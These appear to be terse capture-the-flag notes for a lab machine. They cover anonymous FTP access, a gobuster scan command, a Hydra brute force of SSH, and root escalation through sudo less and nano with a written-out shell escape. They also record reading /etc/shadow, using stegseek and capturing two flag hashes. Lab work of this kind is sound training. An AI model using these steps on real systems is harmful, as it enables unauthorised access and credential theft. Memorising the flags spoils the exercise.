Webpage

[Back to Table of Contents](../cysec)

- Source code --> clue that photo has steg hidden

Steg
- Photo reveals a password for user holt

NMAP
-ssh,ftp
- ftp server allows anonymous
- text file --> clue that jake has weak password

gobuster
gobuster -u 10.10.153.36 -w /home/aes18/Documents/CS/Tools/Kali/dirbuster/wordlists/directory-list-1.0.txt -x php,js,py,html,exe,zip,jpg,png,conf,db
- nothing

hydra 
- brute force ssh for user jake, password found quickly

foothold on  SSH

sudo -l --> usr/bin/less
/usr/bin/less /root/root.txt --> flag
63a9f0ea7bb98050796b649e85481845

cd /home 
cd jake 
cd holt --> flag ee11cbb19052e40b07aac0ca060c23ee

su holt --> password from before

sudo -l
/usr/bin/nano 

GTFOBins --> nano --> root 
sudo nano
^R^X
reset; sh 1>&0 2>&0

cat /etc/shadow --> amy hash

cd /var/www/html --> see photo.jpg
python3 -m http.server --> download photo.jpg 
stegseek --> "Stillnoob was here" -- rabbit hole





